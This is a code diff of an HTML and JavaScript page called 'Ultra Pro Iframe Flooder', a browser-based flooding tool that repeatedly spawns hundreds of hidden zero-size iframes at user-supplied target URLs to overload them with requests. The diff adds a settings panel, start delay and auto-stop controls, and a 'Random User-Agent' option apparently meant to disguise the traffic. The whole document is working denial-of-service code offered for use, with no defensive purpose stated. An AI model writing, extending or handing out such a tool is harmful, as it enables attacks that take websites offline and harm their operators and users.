@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Pro Iframe Flooder</title>
+  <title>🔥 Ultra Pro Iframe Flooder 🔥</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -45,44 +45,67 @@
     #iframeContainer {
       display: none;
     }
+    .loading {
+      color: #FF9800;
+      font-size: 20px;
+    }
+    #settingsMenu {
+      display: none;
+      background-color: #2c2c2c;
+      padding: 15px;
+      border-radius: 8px;
+      margin-top: 20px;
+    }
+    .themeSwitcher {
+      margin-top: 15px;
+    }
   </style>
 </head>
 <body>
 
-  <h1>🔥 Pro Iframe Flooder 🔥</h1>
+  <h1>🔥 Ultra Pro Iframe Flooder 🔥</h1>
 
-  <div>
+  <button onclick="toggleSettings()">Settings</button>
+
+  <div id="settingsMenu">
+    <h3>Flood Settings</h3>
     <label for="targets">Targets (comma separated):</label><br>
-    <input type="text" id="targets" value="https://127.0.0.1/,https://localhost/,https://0.0.0.0/"><br>
+    <input type="text" id="targets" value="https://example.com,https://localhost"><br>
+    <label for="minIframes">Min Iframes:</label><br>
+    <input type="number" id="minIframes" value="300"><br>
+    <label for="maxIframes">Max Iframes:</label><br>
+    <input type="number" id="maxIframes" value="500"><br>
+    <label for="minInterval">Min Interval (ms):</label><br>
+    <input type="number" id="minInterval" value="100"><br>
+    <label for="maxInterval">Max Interval (ms):</label><br>
+    <input type="number" id="maxInterval" value="200"><br>
+    <label for="autoStop">Auto Stop (sec):</label><br>
+    <input type="number" id="autoStop" value="40"><br>
+    <label for="startDelay">Start Delay (sec):</label><br>
+    <input type="number" id="startDelay" value="0"><br>
 
-    <input type="number" id="minIframes" placeholder="Min Iframes per batch" value="300" min="1"><br>
-    <input type="number" id="maxIframes" placeholder="Max Iframes per batch" value="500" min="1"><br>
-
-    <input type="number" id="minInterval" placeholder="Min Spawn Interval (ms)" value="100" min="10"><br>
-    <input type="number" id="maxInterval" placeholder="Max Spawn Interval (ms)" value="200" min="10"><br>
-
-    <input type="number" id="autoStop" placeholder="Auto Stop After (seconds)" value="40" min="5"><br>
-
-    <input type="number" id="startDelay" placeholder="Start Delay (seconds)" value="0" min="0"><br>
-
-    <label for="theme">Theme:</label>
+    <label for="extremeMode">Extreme Mode:</label><br>
+    <input type="checkbox" id="extremeMode"><br>
+    
+    <label for="playSound">Play Sound:</label><br>
+    <input type="checkbox" id="playSound"><br>
+    
+    <label for="theme">Theme:</label><br>
     <select id="theme">
       <option value="dark">Dark</option>
       <option value="light">Light</option>
     </select><br>
 
-    <label for="extremeMode">Extreme Mode:</label>
-    <input type="checkbox" id="extremeMode"><br>
-
-    <label for="playSound">Play Sound:</label>
-    <input type="checkbox" id="playSound"><br>
+    <label for="userAgentRandom">Random User-Agent:</label><br>
+    <input type="checkbox" id="userAgentRandom"><br>
   </div>
 
-  <button onclick="startFlood()">Start Pro Flood</button>
+  <button onclick="startFlood()">Start Flood</button>
   <button class="stop" onclick="stopFlood()">Stop Flood</button>
 
   <div id="status">Status: Ready</div>
   <div id="iframeContainer"></div>
+  <div class="loading" id="loadingIndicator" style="display:none;">Flood in progress...</div>
 
   <audio id="beep" src="beep.mp3"></audio>
 
@@ -92,6 +115,12 @@
     let isFlooding = false;
     let targetList = [];
     let targetIndex = 0;
+    let userAgentList = [
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+      'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0',
+      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+    ];
 
     function randomBetween(min, max) {
       return Math.floor(Math.random() * (max - min + 1)) + min;
@@ -114,9 +143,15 @@
       }
     }
 
+    function getRandomUserAgent() {
+      return userAgentList[Math.floor(Math.random() * userAgentList.length)];
+    }
+
     function startFlood() {
       if (isFlooding) return;
       isFlooding = true;
+      document.getElementById('status').innerText = "Status: Flooding in progress...";
+      document.getElementById('loadingIndicator').style.display = 'block';
 
       const minIframes = parseInt(document.getElementById('minIframes').value) || 300;
       const maxIframes = parseInt(document.getElementById('maxIframes').value) || 500;
@@ -132,8 +167,6 @@
       }
       targetIndex = 0;
 
-      document.getElementById('status').innerText = `Status: Flooding in progress...`;
-
       setTimeout(function() {
         function floodBatch() {
           if (!isFlooding) return;
@@ -148,13 +181,15 @@
             iframe.style.width = "0px";
             iframe.style.height = "0px";
             iframe.style.border = "none";
+            if (document.getElementById('userAgentRandom').checked) {
+              iframe.setAttribute('user-agent', getRandomUserAgent());
+            }
             container.appendChild(iframe);
           }
 
           document.getElementById('status').innerText = `Flooded ${iframeCount} iframes to ${target}`;
 
           targetIndex = (targetIndex + 1) % targetList.length;
-
           const nextInterval = randomBetween(minInterval, maxInterval);
           intervalId = setTimeout(floodBatch, nextInterval);
         }
@@ -175,6 +210,16 @@
       isFlooding = false;
       document.getElementById('iframeContainer').innerHTML = "";
       document.getElementById('status').innerText = "Status: Flood stopped.";
+      document.getElementById('loadingIndicator').style.display = 'none';
+    }
+
+    function toggleSettings() {
+      const menu = document.getElementById('settingsMenu');
+      if (menu.style.display === 'none') {
+        menu.style.display = 'block';
+      } else {
+        menu.style.display = 'none';
+      }
     }
 
     // Change theme when the page loads
